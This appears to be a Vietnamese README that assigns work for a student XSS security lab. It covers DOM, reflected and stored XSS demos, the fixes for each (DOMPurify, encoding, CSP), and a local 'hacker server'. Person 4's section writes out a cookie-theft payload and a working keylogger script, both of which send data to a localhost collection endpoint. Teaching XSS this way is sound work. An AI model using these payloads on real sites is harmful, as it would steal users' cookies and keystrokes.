# Phân công công việc — XSS Security Lab

---

## Person 1 — DOM XSS + UI Layout ✅

**Demo:** `/xss-demo`  
Nhập payload vào ô input, xem **side-by-side**: panel trái render HTML thô (vulnerable), panel phải render text thuần (safe).

**Payload thử:**
```html
<img src=x onerror="alert('DOM XSS')">
<svg onload="alert(1)">
```

**Files phụ trách:**
```
frontend/src/components/XSSDemo.tsx        ← DOM XSS demo (dangerouslySetInnerHTML)
frontend/src/components/Layout/Header.tsx
frontend/src/components/Layout/Footer.tsx
frontend/src/components/Layout/Layout.tsx
frontend/src/pages/Login.tsx
frontend/src/pages/Register.tsx
frontend/src/App.tsx                       ← Routes
```

---

## Person 2 — Reflected XSS + Authentication ✅

**Demo:** Backend endpoint — dán thẳng URL vào browser

```
# Vulnerable — script thực thi
http://localhost:3000/demo/reflected-xss?msg=<script>alert('Reflected')</script>

# Fixed — script render thành text
http://localhost:3000/demo/reflected-xss-fixed?msg=<script>alert('Reflected')</script>
```

**Files phụ trách:**
```
backend/src/routes/auth.ts       ← POST /api/register, /login, /logout, GET /me
backend/src/routes/xss-demo.ts   ← GET /demo/reflected-xss (dùng he.encode để fix)
backend/src/middleware/auth.ts   ← JWT middleware
backend/src/lib/prisma.ts
```

---

## Person 3 — Stored XSS + Posts + Comments + Security Dashboard ✅

**Demo:** 3 phần

### A. Stored XSS qua Post
1. Vào `/posts/new` → chọn **Vulnerable Mode** → dùng Payload Library chọn payload → Đăng bài
2. Mở bài → script thực thi → chuyển sang **Secure Mode** → bị DOMPurify chặn

**Payload thử từ Payload Library:**
```html
<script>alert('Stored XSS')</script>
<img src=x onerror="alert('IMG')">
```

### B. Stored XSS qua Comment
Tương tự — nhập payload vào ô comment, toggle Vulnerable/Secure.

### C. Security Dashboard (`/security`)
- Chọn payload → so sánh 5 phương pháp sanitization cạnh nhau
- Toggle **CSP ON** → browser chặn inline script dù payload đã inject
- Nhập custom payload để phân tích risk level

**Files phụ trách:**
```
backend/src/routes/posts.ts                    ← CRUD posts (raw vs DOMPurify)
backend/src/routes/comments.ts                 ← Add/delete comments
backend/src/utils/xss-detector.ts             ← Phát hiện XSS pattern
backend/src/middleware/csp.ts                  ← Content Security Policy toggle
backend/prisma/schema.prisma                   ← Post, Comment models

frontend/src/pages/Posts.tsx                   ← Danh sách bài viết
frontend/src/pages/CreatePost.tsx              ← Form tạo bài + Payload Library
frontend/src/pages/Post.tsx                    ← Xem bài + toggle Vuln/Secure
frontend/src/pages/SecurityDashboard.tsx       ← So sánh sanitization
frontend/src/components/CommentSection.tsx     ← Comment list + form
frontend/src/lib/api.ts                        ← API client
```

---

## Person 4 — Hacker Server ✅

**Demo:** `http://localhost:4000`  
Dashboard real-time nhận dữ liệu từ XSS payload của Person 3.

### Quy trình demo đầy đủ
1. Mở Hacker Dashboard tại `http://localhost:4000`
2. Vào `/posts/new` → **Vulnerable Mode** → chọn payload **Cookie Theft**:
   ```html
   <img src=x onerror="fetch('http://localhost:4000/steal?cookie='+document.cookie)">
   ```
   > ⚠️ Cookie có `httpOnly` nên `document.cookie` trống — dùng payload dưới thay thế

3. Payload hoạt động thực tế — **Keylogger**:
   ```html
   <script>document.onkeypress=function(e){fetch('http://localhost:4000/steal?type=key&key='+e.key)}</script>
   ```
4. Đăng bài → mở bài → gõ phím → xem keystroke xuất hiện real-time trên Hacker Dashboard

**Files phụ trách:**
```
hacker-server/src/index.ts      ← Express + WebSocket server
hacker-server/public/index.html ← Dashboard UI (real-time table, filter, copy)
hacker-server/package.json
hacker-server/tsconfig.json
```

**API Hacker Server:**
```
GET  /steal?cookie=&type=   ← Nhận data qua img tag (trả về 1x1 pixel)
POST /steal                 ← Nhận data qua fetch body
GET  /api/logs              ← Lấy tất cả stolen data
DELETE /api/logs            ← Xóa logs
WS   ws://localhost:4000    ← Real-time push to dashboard
```
